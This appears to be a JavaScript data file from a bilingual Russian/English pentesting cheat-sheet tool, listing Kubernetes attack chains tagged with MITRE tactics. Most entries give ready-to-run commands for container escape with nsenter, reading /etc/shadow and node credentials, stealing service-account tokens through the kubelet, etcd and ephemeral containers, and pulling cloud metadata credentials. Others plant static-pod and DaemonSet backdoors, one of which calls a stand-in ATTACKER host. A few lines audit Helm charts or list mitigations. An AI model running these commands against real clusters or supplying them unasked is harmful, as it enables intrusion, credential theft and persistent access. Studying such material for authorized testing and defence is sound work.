        { t: M('Список репозиториев', 'List repos'), c: 'curl http://127.0.0.1:1235/v2/_catalog' },
        { t: M('Манифест образа', 'Image manifest'), c: 'curl http://127.0.0.1:1235/v2/IMAGE/manifests/latest | grep -i env' },
        { t: M('Слои через docker history', 'Layers via docker history'), c: 'docker history --no-trunc IMAGE; docker save IMG -o img.tar && tar xf img.tar && find . -name layer.tar -exec tar xf {} \\;' },
      ],
    },
    {
      id: 'k8s-untrusted-helm-chart',
      title: M('Недоверенный Helm chart → привилегированная workload', 'Untrusted Helm chart → privileged workload'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Зафиксировать и распаковать chart', 'Pin and unpack the chart'), c: 'helm pull REPO/CHART --version VERSION --untar' },
        { t: M('Отрендерить итоговые manifests', 'Render the final manifests'), c: 'helm template release ./CHART --values values.yaml > rendered.yaml' },
        { t: M('Найти privileged host access', 'Find privileged host access'), c: 'grep -nE "privileged: true|host(Network|PID|IPC): true|hostPath:" rendered.yaml' },
        { t: M('Проверить schema и security policy', 'Validate schema and security policy'), c: 'kubeconform -strict -summary rendered.yaml && kubescape scan framework nsa rendered.yaml' },
      ],
    },
    {
      id: 'k8s-ns-bypass',
      title: M('Namespace bypass → cross-NS access', 'Namespace bypass → cross-NS access'),
      level: 'Intermediate',
      mitre: 'TA0008 (Lateral Movement)',
      steps: [
        { t: M('Запустить hacker-container', 'Run hacker-container'), c: 'kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh' },
        { t: M('Network discovery', 'Network discovery'), c: 'ip route; zmap -p 6379 10.0.0.0/8 -o res.csv' },
        { t: M('Найти Redis', 'Find Redis'), c: 'zmap -p 6379 10.0.0.0/8 | head -5' },
        { t: M('Извлечь данные из Redis', 'Extract Redis data'), c: 'redis-cli -h 10.12.0.2 KEYS "*"; redis-cli -h 10.12.0.2 GET SECRETSTUFF' },
      ],
    },
    {
      id: 'k8s-backdoor-ds',
      title: M('CDK: backdoor DaemonSet', 'CDK: backdoor DaemonSet'),
      level: 'Advanced',
      mitre: 'TA0003 (Persistence)',
      steps: [
        { t: M('CDK evaluate', 'CDK evaluate'), c: './cdk evaluate --full' },
        { t: M('Создать backdoor DaemonSet', 'Create backdoor DaemonSet'), c: './cdk run k8s-backdoor-daemonset default nginx:alpine "curl http://ATTACKER:8080/$(hostname)"' },
        { t: M('Backdoor на всех нодах', 'Backdoor on all nodes'), c: 'kubectl get ds -A' },
        { t: M('Persistent доступ', 'Persistent access'), c: 'kubectl exec -it ds/backdoor -- bash' },
      ],
    },
    {
      id: 'k8s-shadow-api',
      title: M('CDK: shadow API server', 'CDK: shadow API server'),
      level: 'Advanced',
      mitre: 'TA0003 (Persistence)',
      steps: [
        { t: M('Развернуть shadow API', 'Deploy shadow API'), c: './cdk run k8s-shadow-apiserver default' },
        { t: M('Auth bypass (AlwaysAllow)', 'Auth bypass (AlwaysAllow)'), c: 'curl -k https://SHADOW_IP:9444/api/v1/secrets' },
        { t: M('Полный контроль кластера', 'Full cluster control'), c: 'kubectl --insecure-skip-tls-verify -s https://SHADOW_IP:9444 get pods -A' },
      ],
    },
    {
      id: 'k8s-etcd-tokens',
      title: M('etcd → SA tokens extraction', 'etcd → SA tokens extraction'),
      level: 'Advanced',
      mitre: 'TA0006 (Credential Access)',
      steps: [
        { t: M('Доступ к etcd из пода', 'Access etcd from pod'), c: './cdk run etcd-get-k8s-token default https://ETCD:2379' },
        { t: M('Либо прямой curl', 'Or direct curl'), c: 'curl --cert ca.crt --key ca.key https://ETCD:2379/v2/keys/registry/secrets' },
        { t: M('Декодировать token', 'Decode token'), c: 'полученный token = любое SA в кластере' },
      ],
    },
    {
      id: 'k8s-capability-escape',
      title: M('Capability check → nsenter escape', 'Capability check → nsenter escape'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Проверить capabilities', 'Check capabilities'), c: 'capsh --print; amicontained' },
        { t: M('Если SYS_ADMIN или SYS_PTRACE', 'If SYS_ADMIN or SYS_PTRACE'), c: 'nsenter -t 1 -m --uts --ipc --pid bash' },
        { t: M('Проверить host доступ', 'Check host access'), c: 'cat /etc/shadow; ps aux' },
        { t: M('Забрать kubeconfig', 'Steal kubeconfig'), c: 'kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes' },
      ],
    },
    {
      id: 'k8s-scanner-misconfig',
      title: M('Сканер → найти misconfig → эксплуатировать', 'Scanner → find misconfig → exploit'),
      level: 'Intermediate',
      mitre: 'TA0007 (Discovery)',
      steps: [
        { t: M('Запустить kubescape', 'Run kubescape'), c: 'kubescape scan --format json' },
        { t: M('Или popeye', 'Or popeye'), c: 'popeye --json' },
        { t: M('Найти уязвимый под', 'Find vulnerable pod'), c: 'kubectl get pods -A | grep -E "privileged|hostPath|hostPID"' },
        { t: M('Использовать найденное', 'Exploit findings'), c: 'kubectl exec -it VULN_POD -- bash; capsh --print' },
      ],
    },
    {
      id: 'k8s-trufflehog-secrets',
      title: M('Git-секреты → credentials', 'Git secrets → credentials'),
      level: 'Newbie',
      mitre: 'TA0006 (Credential Access)',
      steps: [
        { t: M('Сдампить git репозиторий', 'Dump git repo'), c: 'python3 git-dumper.py http://TARGET/.git repo' },
        { t: M('Сканировать trufflehog', 'Scan with trufflehog'), c: 'trufflehog git file://repo' },
        { t: M('Найти секреты', 'Find secrets'), c: 'trufflehog filesystem repo --json | grep -i "aws_key\|password\|token"' },
        { t: M('Использовать креды', 'Use credentials'), c: 'export AWS_ACCESS_KEY_ID=...; aws s3 ls' },
      ],
    },
    {
      id: 'k8s-amicontained-recon',
      title: M('Amicontained → рекон среды', 'Amicontained → environment recon'),
      level: 'Newbie',
      mitre: 'TA0007 (Discovery)',
      steps: [
        { t: M('Запустить amicontained', 'Run amicontained'), c: 'amicontained' },
        { t: M('Узнать runtime', 'Identify runtime'), c: 'Container runtime: docker/containerd/podman' },
        { t: M('Узнать capabilities', 'Identify capabilities'), c: 'Capabilities: CHOWN, DAC_OVERRIDE, SYS_ADMIN, ...' },
        { t: M('План эскалации', 'Escalation plan'), c: 'SYS_ADMIN → nsenter; SYS_PTRACE → process injection' },
      ],
    },
    {
      id: 'k8s-kubelet-anon',
      title: M('Kubelet anonymous API → exec на ноде', 'Kubelet anonymous API → exec on node'),
      level: 'Advanced',
      mitre: 'TA0002 (Execution)',
      steps: [
        { t: M('Найти kubelet (часто 10250/TCP)', 'Find kubelet (often 10250/TCP)'), c: 'nmap -p 10250,10255 NODE_IP; curl -k https://NODE_IP:10250/pods' },
        { t: M('Список подов без RBAC (anon/auth)', 'List pods without RBAC (anon/auth)'), c: 'kubeletctl pods -s NODE_IP  ||  curl -k https://NODE_IP:10250/runningpods/' },
        { t: M('Exec / run через kubelet', 'Exec / run via kubelet'), c: 'kubeletctl exec -s NODE_IP -p POD -c CONTAINER -n NS -- id' },
        { t: M('Кража SA token из соседнего пода', 'Steal SA token from neighboring pod'), c: 'kubeletctl exec -s NODE_IP -p POD -c C -n NS -- cat /var/run/secrets/kubernetes.io/serviceaccount/token' },
        { t: M('Использовать token против apiserver', 'Use token against apiserver'), c: 'curl -k -H "Authorization: Bearer $TOKEN" https://APISERVER/api/v1/secrets' },
      ],
    },
    {
      id: 'k8s-hostpath-static-pod',
      title: M('hostPath → static pod backdoor', 'hostPath → static pod backdoor'),
      level: 'Advanced',
      mitre: 'TA0003 (Persistence)',
      steps: [
        { t: M('Проверить hostPath / writable mounts', 'Check hostPath / writable mounts'), c: 'mount; ls -la /host /mnt/host 2>/dev/null; cat /proc/1/mountinfo | head' },
        { t: M('Найти manifests dir на host', 'Find manifests dir on host'), c: 'ls /host/etc/kubernetes/manifests 2>/dev/null || ls /etc/kubernetes/manifests' },
        { t: M('Drop static pod (kubelet поднимет сам)', 'Drop static pod (kubelet will start it)'), c: 'cat > /host/etc/kubernetes/manifests/pwn.yaml <<EOF\napiVersion: v1\nkind: Pod\nmetadata: {name: pwn-static}\nspec:\n  hostNetwork: true\n  hostPID: true\n  containers:\n  - name: c\n    image: alpine\n    command: ["sleep","inf"]\n    securityContext: {privileged: true}\n    volumeMounts: [{name: h, mountPath: /host}]\n  volumes: [{name: h, hostPath: {path: /}}]\nEOF' },
        { t: M('Проверить persistence после рестарта', 'Verify persistence after restart'), c: 'kubectl get pods -A | grep pwn-static; crictl pods | grep pwn' },
      ],
    },
    {
      id: 'k8s-hostpid-nsenter',
      title: M('hostPID → nsenter на host PID 1', 'hostPID → nsenter into host PID 1'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Проверить hostPID / shared namespaces', 'Check hostPID / shared namespaces'), c: 'cat /proc/1/cgroup; ls -l /proc/1/root; amicontained; kdigger dig all' },
        { t: M('Если hostPID — войти в PID 1', 'If hostPID — enter PID 1'), c: 'nsenter -t 1 -m -u -i -n -p -- bash  ||  nsenter -t 1 -a bash' },
        { t: M('Host filesystem / shadow', 'Host filesystem / shadow'), c: 'cat /etc/shadow; ls /var/lib/kubelet/pods' },
        { t: M('Kubeconfig / node creds', 'Kubeconfig / node creds'), c: 'cat /etc/kubernetes/kubelet.conf; cat /var/lib/kubelet/pki/* 2>/dev/null | head' },
      ],
    },
    {
      id: 'k8s-create-pod-steal-sa',
      title: M('create pods → mount victim SA → escalate', 'create pods → mount victim SA → escalate'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Проверить can-i create pods / get secrets', 'Check can-i create pods / get secrets'), c: 'kubectl auth can-i create pods; kubectl auth can-i get secrets --all-namespaces' },
        { t: M('Найти privileged SA / secret с token', 'Find privileged SA / token secret'), c: 'kubectl get sa,secrets -A | grep -iE "token|admin|deploy"' },
        { t: M('Создать под с volume = SA secret жертвы', 'Create pod mounting victim SA secret'), c: 'kubectl apply -f - <<EOF\napiVersion: v1\nkind: Pod\nmetadata: {name: sa-thief}\nspec:\n  containers:\n  - name: c\n    image: alpine\n    command: ["sleep","3600"]\n    volumeMounts: [{name: t, mountPath: /stolen}]\n  volumes:\n  - name: t\n    secret: {secretName: VICTIM-SA-TOKEN-SECRET}\nEOF' },
        { t: M('Украсть token и ходить в API как жертва', 'Steal token and call API as victim'), c: 'TOKEN=$(kubectl exec sa-thief -- cat /stolen/token); curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST/apis/rbac.authorization.k8s.io/v1/clusterroles' },
      ],
    },
    {
      id: 'k8s-ephemeral-container',
      title: M('Ephemeral container → debug shell в чужом поде', 'Ephemeral container → debug shell in target pod'),
      level: 'Intermediate',
      mitre: 'TA0002 (Execution)',
      steps: [
        { t: M('Проверить право pods/ephemeralcontainers', 'Check pods/ephemeralcontainers permission'), c: 'kubectl auth can-i update pods/ephemeralcontainers -n TARGET_NS' },
        { t: M('Добавить ephemeral debug container', 'Attach ephemeral debug container'), c: 'kubectl debug -it POD -n NS --image=busybox --target=APP_CONTAINER -- sh' },
        { t: M('Либо patch ephemeralContainers', 'Or patch ephemeralContainers'), c: 'kubectl patch pod POD -n NS --type=json -p=\'[{"op":"add","path":"/spec/ephemeralContainers","value":[{"name":"dbg","image":"busybox","command":["sleep","inf"],"targetContainerName":"APP"}]}]\'' },
        { t: M('Читать FS / token целевого контейнера', 'Read target container FS / token'), c: 'kubectl exec -it POD -n NS -c dbg -- cat /proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token' },
      ],
    },
    {
      id: 'k8s-runc-leaky-vessels',
      title: M('runc CVE-2024-21626 (Leaky Vessels) → host FS', 'runc CVE-2024-21626 (Leaky Vessels) → host FS'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Контекст: runc file-descriptor / WORKDIR leak', 'Context: runc file-descriptor / WORKDIR leak'), c: '# CVE-2024-21626 — container breakout via leaked host FD / crafted WORKDIR' },
        { t: M('Проверить версии runtime', 'Check runtime versions'), c: 'runc --version; containerd --version; cat /proc/self/status | grep -i seccomp' },
        { t: M('PoC-класс: process с cwd = host path через leak', 'PoC-class: process cwd = host path via leak'), c: '# lab: use public PoC only in authorized range; goal = read /etc/shadow on host' },
        { t: M('После escape — node creds / kubelet', 'After escape — node creds / kubelet'), c: 'cat /etc/kubernetes/kubelet.conf; ls /var/lib/kubelet/pki/' },
        { t: M('Митигации', 'Mitigations'), c: 'patch runc/containerd; drop CAP_SYS_ADMIN; user namespaces; gVisor/Kata' },
      ],
    },
    {
      id: 'k8s-pod-to-cloud-imds',
      title: M('Pod → cloud IMDS / IRSA → cloud admin', 'Pod → cloud IMDS / IRSA → cloud admin'),
      level: 'Advanced',
      mitre: 'TA0006 (Credential Access)',
      steps: [
        { t: M('Проверить cloud identity env', 'Check cloud identity env'), c: 'env | grep -iE "AWS_|GOOGLE_|AZURE_|irsa|identity"; ls /var/run/secrets/eks.amazonaws.com/ 2>/dev/null' },
        { t: M('IMDS (AWS classic)', 'IMDS (AWS classic)'), c: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE' },
        { t: M('IMDSv2 / EKS IRSA token', 'IMDSv2 / EKS IRSA token'), c: 'TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token); curl -H "Authorization: Bearer $TOKEN" $AWS_WEB_IDENTITY_TOKEN_FILE 2>/dev/null; aws sts get-caller-identity' },
        { t: M('GCP / Azure metadata', 'GCP / Azure metadata'), c: 'curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token; curl -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/' },
        { t: M('Pivot в cloud API', 'Pivot to cloud API'), c: 'aws s3 ls; gcloud projects list; az account list -o table' },
      ],
    },
    {
      id: 'k8s-etcd-raw',
      title: M('Unauth etcd → dump secrets/tokens', 'Unauth etcd → dump secrets/tokens'),
      level: 'Advanced',
      mitre: 'TA0006 (Credential Access)',
      steps: [
        { t: M('Найти etcd (2379/2380)', 'Find etcd (2379/2380)'), c: 'nmap -p 2379,2380 CONTROL_PLANE_IP; ss -lntp | grep 2379' },
        { t: M('Проверить unauth / weak TLS', 'Check unauth / weak TLS'), c: 'curl -k https://ETCD:2379/version; curl -k https://ETCD:2379/v3/kv/range -d \'{"key":"AA==","range_end":"AA=="}\'' },
        { t: M('etcdctl get prefix secrets', 'etcdctl get prefix secrets'), c: 'ETCDCTL_API=3 etcdctl --endpoints=https://ETCD:2379 get /registry/secrets --prefix --keys-only' },
        { t: M('Извлечь SA tokens / kubeconfig material', 'Extract SA tokens / kubeconfig material'), c: 'ETCDCTL_API=3 etcdctl get /registry/secrets/kube-system --prefix | less' },
        { t: M('Альтернатива CDK', 'CDK alternative'), c: './cdk run etcd-get-k8s-token default https://ETCD:2379' },
      ],
    },
  ],
};

  Object.assign(DATA, { REPORT_TEMPLATES, CMD_BUILDERS, KUBER_DATA });
})();
